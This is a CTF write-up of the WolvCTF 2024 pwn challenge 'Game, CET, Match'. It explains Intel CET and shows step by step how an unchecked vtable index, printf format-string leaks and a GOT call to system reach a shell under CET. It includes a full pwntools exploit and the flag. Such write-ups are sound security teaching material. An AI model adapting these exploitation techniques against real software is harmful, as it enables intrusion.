# WolvCTF 2024 Writeup (Team: L3ak, 4th Place)
Competition URL: https://wolvctf.io/
## Overview

| Challenge | Category | Points | Flag | Techniques
| --------- | -------- | ------ | ---- | ------
| Game, CET, Match | pwn | 493 | wctf{y0u_c4nt_b3_s3r1ous_appr0ved_g4dg3t5_0nly} | CET,Format Strings,Vtable Hijacking

I wrote a tennis client with the bleeding-edge mitigations, that means it's unhackable, right?

## Game, CET, Match
in this challenge we are giving the following binary [chal](./chal) . No Dockerfile , no libc, no nothing.

so first of all let's try checksec

```sh
[*] '/home/kali/ctfs/wolvctf/game_cet/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

well . we got full mitigations enabled . but who knows what's inside . let's poke inside now and see what it does.

```c
int main(void){
    ulong option;
    long in_FS_OFFSET;
    char *arg;
    undefined8 input_len;
    char buf [264];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);
    arg = "";
    setbuf(stdout,(char *)0x0);
    setbuf(stderr,(char *)0x0);
    while( true ) {
        puts("Select an option:");
        puts("1. Serve");
        puts("2. Lob");
        puts("3. Taunt");
        puts("4. Hear taunt");
        printf("> ");
        input_len = read(1,buf,0xff);
        if (input_len == 0) break;
        buf[input_len + -1] = '\0';
        option = strtol(buf,&arg,10);
        arg = arg + 1;
        printf("You selected %d\n",(int)option);
        if ((int)option == 0) {
            puts("Invalid selection!");
        }
        else {
            (*(code *)ptrs[(int)option + -1])(arg);
        }
    }
    fwrite("Error reading input\n",1,0x14,stderr);
    ...
}
```

This is our main function . you can observe that we have 4 options and based on each one of those we get to choose a function to call from the vtable(ptrs) . one observation you might get is that there's no check on the return of `strtol` . whatever you give it it's gonna go and execute anything relative to the binary base including our beloved `GOT` . and here comes the other observation is that `strtol` will return a signed long . all subsequent operations on the `option` will also work with a signed number . with that we can go forward or backwards . this thing keeps getting better and better . now let's look at that vtable.

```c
0x555555558020 <ptrs>:  
    0x0000555555555249 => swing      
    0x0000555555555287 => lob
    0x00005555555552bc => taunt   
    0x0000555555555321 => hear_taunt
```

now let's decompile them 

```c
int swing(void)

{
  puts("You make a rough swing at your opponent");
  printf("%p\n",banter);
  return 0;
}

int lob(void)

{
  puts("Alley-oop!");
  banter = banter << 8;
  return 0;
}

int taunt(char *string)

{
    int num;
    char *local_banter;

    local_banter = string;
    if (*string == '\0') {
        local_banter = "<INSERT BANTER HERE>";
    }
    printf("You say to your opponent: \'%s\'\n",local_banter);
    num = atoi(local_banter);
    banter = banter | (long)num;
    return 0;
}

void hear_taunt(void)

{
    ...
    puts("Your opponent taunts \"You can\'t reach me!\"");
    argv = "/bin/sh";
    argv_1 = 0;
    execve("/bin/sh",&argv,(char **)0x0);
    ...
}
```

oh wait . we got a function that does `execve("/bin/sh",...)` .. woah , let's see if it works

![gif_getting_local_shell](assets/gif_getting_local_shell.gif)

well, That was unexpected, as you can see it does work . easiest challenge ever . let's goooooo.

until you try it on remote and realize the `CET` in the name of the challenge. quick google search gave me this one-liner to check since checksec didn't give us this info . although it sometimes does depending on the version you have.

```shell
    readelf -n ./chal| grep -a SHSTK
        Properties: x86 feature: IBT, SHSTK
```

### Intel CET
to those who don't know `Intel CET` is the hotest trend in preventing `ROP/JOP` and it is the thing that will make our lives as pwners a lot more difficult in the future . It's intel implementation of the `CFI` "Control Flow Integrity" technology . in a nutshell they're trying to prevent unauthorized jumps that the application wasn't trying to make on it's own . it's got multiple different techniques.

* `SHSTK` "Shadow Stack" which mimics the original stack so we got two duplicates of `saved RIP` when we do a `Call` instruction of it's application so when you try to do a `RET` for example . it will check the value in the "Shadow Stack" and compare it to the one in the program stack which we as attacker might have clobbered it using a stack buffer overflow or something else for the same effect . if it detects a mismatch it stop execution of the program and output an error message.

* `IBT` "Indirect branch tracking" are mainly implemented in `ENDBR` instructions . you probably have seen them these days a lot . because compilers started inserting them at every function call since a few years ago when the `CET` started to take off . they mean "END BRANCH" . and without going into too much details . the CPU have a state machine that will keep track of the program state . whenever you do a call or indirect jump then the cpu will set that state to something and once the CPU takes that jump or call it assumes the first instruction it will hit is either `ENDBR32` or `ENDBR64` or else it abort execution and output an error message. and because `ROP` relies on us jumping in the middle of the program or sometimes in the middle of an instruction then this effectively eliminates most of our `ROP gadgets` . only gadgets that are acceptable are the ones that start with the end branch instruction which you won't find as common . if you ever find one.

for more information about `CET` there's better resources out there especially this [intel article](https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html)

there's an emulator that we can use to test this .intel sde .. you can download it from [here](https://www.intel.com/content/www/us/en/download/684897/intel-software-development-emulator.html) . and read more about the arguments that you can use with it [here](https://www.intel.com/content/www/us/en/developer/articles/technical/emulating-applications-with-intel-sde-and-control-flow-enforcement-technology.html)

I've saved you the trouble of finding out which switches you can use to simulate the same env as remote

`sde64 -future -cet -cet-stderr -cet-endbr-exe -- ./chal_patched`

For this challenge we don't have to deal with the shadow stack since we're not gonna modify the `saved RIP`s on the stack and we don't need to `ROP`. Luckily for us we got a vtable that we can modify somehow and exploit so that leaves us with the `ENDBR64` . there's no `ENDBR64` instruction in that function `hear_taunt` so basically we can't just call it and profit . now we need to do something else.

recall from the beginning we can call any function pointers relative to the binary image . which means we got to call any functions in the `GOT` . we got `execve` in the GOT bcs of the `hear_taunt` soooooooo . you might have guessed it . we can try to call execve and see what will happen.


![gif_trying_execve](assets/gif_trying_execve.gif)


well . this was an epic fail right! . we have control over the first argument to the function given that it's a pointer . we can put arbitiry data that goes up to `0xf0` bytes . but we don't have control over the `$RSI` . we'll have to do with whatever that was left in it . that's okay though . let's look at `$RDX` tho . 


```as
                             LAB_00101518                                    XREF[1]:     00101508(j)  
        00101518 8b 85 dc        MOV        EAX,dword ptr [RBP + local_12c]
                 fe ff ff
        0010151e 83 e8 01        SUB        EAX,0x1
        00101521 48 98           CDQE
        00101523 48 8d 14        LEA        RDX,[RAX*0x8]
                 c5 00 00 
                 00 00
        0010152b 48 8d 05        LEA        RAX,[ptrs]
                 ee 2a 00 00
        00101532 48 8b 14 02     MOV        RDX,qword ptr [RDX + RAX*0x1]=>ptrs
        00101536 48 8b 85        MOV        RAX,qword ptr [RBP + arg]
                 e0 fe ff ff
        0010153d 48 89 c7        MOV        RDI,RAX
        00101540 ff d2           CALL       RDX
```

Looks like the `$RDX` will always have a pointer to the the function we're calling . which in this case gonna be `execve` . which is not gonna be compatible with the `envp` . recall that `envp` is an array of char*. but I still didn't get it! . after a bit of experimentation using a toy example of creating envp/argv and using them . I came to the conclusion that `$RDX` will never work . we needed control over `$RDX` either to set it properly to an array of strings that end with a `NULL` or to be `NULL` itself . and we can't do either. but not all hope is lost .

### Recap
we can call any function of the `GOT` we have control over `$RDI` if the target function needs a pointer and that's about all the control we have here . a very obvious target would be `system("/bin/sh");` . but we need to leak libc and put that system function pointer somewhere relative to the binary image . that's where the functionality of `swing/lob/taunt` come into play . they can modify the `banter` global variable which in a constant offset from our vtable `ptrs`. 

so now all that's left is the libc leak . we have printf in the GOT so we can use that with a controlled `$RDI` to leak the stack and find out where the libc addresses are . usually with `ASLR` and `PIE` enabled we can assume the following

* libs addresses will start `0x7f` .
* binary addersses will start at `0x5?` .
* addresses will be 6 bytes .

Those are not a requirement . but it's the usual behavior of the loader and the Linux kernel's memory management subsystem.

we can't leak libc blindly but we can leak binary addresses blindly though since the binary image is small enough we can guess the binary image base without too much of a hassle.
 
### Game Plan

+ leak binary base. 
+ leak GOT values. 
+ use the [Libc Databse Search](https://libc.blukat.me/) to find out which libc was used.
+ place system function pointer from libc into `banter`.
+ profit

### Exploit
Since I already done that stuff manually I herby present you with the final exploit with the correct libc used on remote.

```py

from pwn import *
context.log_level = 'INFO'

if args.REMOTE:
    p = remote('45.76.30.75',1337)
else:
    p = process('./chal_patched',env={},stdout=process.PTY, stdin=process.PTY)
    # gdb.attach(p,gdbscript= 'b printf')

elf             = ELF('./chal_patched',checksec=False)
libc            = ELF('./lib/libc.so.6',checksec=False)

printf_off = ((elf.got.printf       - elf.symbols.ptrs)// 8)+1
banter_off = ((elf.symbols.banter   - elf.symbols.ptrs)// 8)+1

s2p = lambda x : u64(x.ljust(8,b'\0'))

def leak_address(off):
    payload = str(printf_off).encode()
    payload+= b' '
    payload+= f'%{off}$p'.encode()
    p.sendlineafter(b'> ',payload)
    p.recvuntil(f'You selected {printf_off}\n'.encode())
    leak = p.recvuntil(b'Select an option')[:-len(b'Select an option')]
    return leak


def leak_string(addr):
    # offset between where the $RSP - the address we place on the stack when calling printf
    off = ((0x00007fffffffdc80 - 0x7fffffffdc38)// 8)+5 

    payload = str(printf_off).encode()
    payload+= b'A'*5
    payload+= f'%{off}$s\n'.encode().ljust(8,b'A')
    payload+= p64(addr)
    
    p.sendlineafter(b'>',payload)

    p.recvuntil(f'You selected {printf_off}\n'.encode())
    p.recvuntil(b'AAAA')
    leak = p.recvline()[:-1]
    return leak


# bruteforced after a few tries to find a valid binary address on remote
main_leak_off = ((0x00007fffffffdd98 - 0x7fffffffdc38)//8 + 5)-10   
main = (int(leak_address(main_leak_off),base=16)&(~0xfff))+0x1000*-1


elf.address = main
log.success(f"bin_base: 0x{elf.address:012x}")

log.info(f"\tprintf:  0x{s2p(leak_string(elf.got.printf)):012x} ")    # 0x7fe5ce422c90
log.info(f"\tputs:    0x{s2p(leak_string(elf.got.puts)):012x} "  )    # 0x7fe5ce445420
log.info(f"\tread:    0x{s2p(leak_string(elf.got.read)):012x} "  )    # 0x7fe5ce4cf1e0


libc.address = s2p(leak_string(elf.got.puts)) - libc.symbols["_IO_puts"]
log.success(f"libc_base: 0x{libc.address:012x}")

for i in range(5,-1,-1):
    x = ((libc.symbols.system & (0xff <<i*8) ) >> (i*8))
    p.sendlineafter(b'> ',f'3 {x}'.encode())            # [taunt] to set the least significat byte on banter
    if i!=0:
        p.sendlineafter(b'> ',b'2')                     # [lob] to left shift it by 8 bits

payload = str(banter_off).encode()
payload+= b' '
payload+= f'/bin/sh\0'.encode()

p.sendlineafter(b'> ',payload)
p.success('popping a shell')
p.clean()
p.interactive()

# wctf{y0u_c4nt_b3_s3r1ous_appr0ved_g4dg3t5_0nly}
```

![congratz](./assets/congratz.gif)